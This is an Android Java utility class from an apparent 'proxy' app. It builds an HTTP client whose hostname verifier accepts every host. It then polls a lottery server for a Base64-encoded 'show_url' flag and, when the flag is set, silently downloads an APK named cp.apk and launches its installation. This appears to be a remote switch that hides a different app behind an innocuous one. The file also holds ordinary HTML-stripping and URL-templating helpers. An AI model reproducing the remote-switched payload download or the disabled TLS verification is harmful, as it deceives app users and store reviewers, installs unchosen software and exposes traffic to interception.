package me.zdnuist.proxy.util;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import com.alibaba.fastjson.JSON;
import com.facebook.stetho.okhttp3.StethoInterceptor;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;
import me.zdnuist.proxy.MainActivity;
import okhttp3.CacheControl;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Request.Builder;
import okhttp3.Response;

/**
 * Created by zd on 2017/12/6.
 */

public class HttpUtil {
  private final static String TAG = "HttpUtil";
  public static final String FILE_PATH = Environment.getExternalStorageDirectory().getPath() + "/download";

  public static OkHttpClient okHttpClient = new OkHttpClient.Builder()
      .addInterceptor(new StethoInterceptor()).hostnameVerifier(new HostnameVerifier() {
        @Override
        public boolean verify(String hostname, SSLSession session) {
          return true;
        }
      }).build();

  public static void  isShow(final Activity context,final String url){
    Request.Builder builder = new Builder().url("http://vipapp.01appddd.com/Lottery_server/get_init_data.php?type=android&appid=136244013111");
    okHttpClient.newCall(builder.build()).enqueue(new Callback() {
      @Override
      public void onFailure(Call call, IOException e) {

        jumpMain(context,2000);
      }

      @Override
      public void onResponse(Call call, Response response) throws IOException {

        if(response != null){
          String text = response.body().string();
          Map<String,Object> result = JSON.parseObject(text, HashMap.class);
          Log.i(TAG,""+result);
          if(result.get("data") != null){
            String encodeStr = String.valueOf(result.get("data"));
            String decodeStr = new String(Base64.decode(encodeStr,0));
            Log.i(TAG,"d:"+decodeStr);
            result = JSON.parseObject(decodeStr, HashMap.class);
            if(result != null && result.get("show_url") != null){
              String show = String.valueOf(result.get("show_url"));
              if(TextUtils.equals(show,"1")){
                downloadFile(context,url);
              }else{
                jumpMain(context,1500);
              }
            }
          }
        }

      }
    });
  }

  public static void downloadFile(final Activity context,String url){
    Log.i(TAG , "downloadFile");
    final File resultFile = new File(FILE_PATH,"cp.apk");
    if(resultFile.exists()){

      installApk(context,resultFile.getPath(),true);

      return;
    }
    Request.Builder builder = new Request.Builder()
        .url(url);
    builder.cacheControl(new CacheControl.Builder().build());
    Request request = builder.build();
    okHttpClient.newCall(request).enqueue(new Callback() {
      @Override
      public void onFailure(Call call, IOException e) {
          e.printStackTrace();
      }

      @Override
      public void onResponse(Call call, Response response) throws IOException {
        if(response != null){
          Log.i(TAG , "downloadFile network success");
          try {
            InputStream inputStream = response.body().byteStream();
            File tmpFile = new File(FILE_PATH, "cp.apk.tmp");
            if (!tmpFile.getParentFile().exists()) {
              tmpFile.getParentFile().mkdirs();
            }

            if (!tmpFile.exists()) {
              tmpFile.createNewFile();
            }

            FileOutputStream fileOutputStream = new FileOutputStream(tmpFile);
            byte[] buffer = new byte[1024 * 6];
            int len = 0;
            while ((len = inputStream.read(buffer)) > 0) {
              fileOutputStream.write(buffer, 0, len);
            }

            fileOutputStream.flush();
            fileOutputStream.close();

            tmpFile.renameTo(resultFile);
            installApk(context,resultFile.getPath(),false);
          }catch (Exception e){
            e.printStackTrace();
          }

        }

      }
    });
  }

  public static void installApk(final Activity context,final String apkPath , boolean isDownloaded){
    if(isDownloaded){
      new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
        @Override
        public void run() {
          Intent intent = new Intent(Intent.ACTION_VIEW);
          File file = new File(apkPath);
          if(!file.exists()){
            return;
          }
          intent.setDataAndType(Uri.parse("file://" + file.toString()), "application/vnd.android.package-archive");

          context.startActivity(intent);

          context.finish();
        }
      },1500);
    }

  }

  public static void jumpMain(final Activity activity,long delay){
    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
      @Override
      public void run() {
        Intent intent = new Intent(activity,MainActivity.class);
        activity.startActivity(intent);
        activity.finish();
      }
    } , delay);

  }

  public static String delHTMLTag(String htmlStr){
    String regEx_script="<script[^>]*?>[\\s\\S]*?<\\/script>"; //定义script的正则表达式
    String regEx_style="<style[^>]*?>[\\s\\S]*?<\\/style>"; //定义style的正则表达式
    String regEx_html="<[^>]+>"; //定义HTML标签的正则表达式

    Pattern p_script=Pattern.compile(regEx_script,Pattern.CASE_INSENSITIVE);
    Matcher m_script=p_script.matcher(htmlStr);
    htmlStr=m_script.replaceAll(""); //过滤script标签

    Pattern p_style=Pattern.compile(regEx_style,Pattern.CASE_INSENSITIVE);
    Matcher m_style=p_style.matcher(htmlStr);
    htmlStr=m_style.replaceAll(""); //过滤style标签

    Pattern p_html=Pattern.compile(regEx_html,Pattern.CASE_INSENSITIVE);
    Matcher m_html=p_html.matcher(htmlStr);
    htmlStr=m_html.replaceAll(""); //过滤html标签

    return htmlStr.trim(); //返回文本字符串
  }


  public static String modifyUrl(String url, Map<String, String> context) {
    if (context != null) {
      Set<String> keySet = context.keySet();
      for (String key : keySet) {
        if (url.contains("#" + key + "#")) {
          url = url.replace("#" + key + "#", context.get(key));
        }
      }
    }
    return url;
  }

}
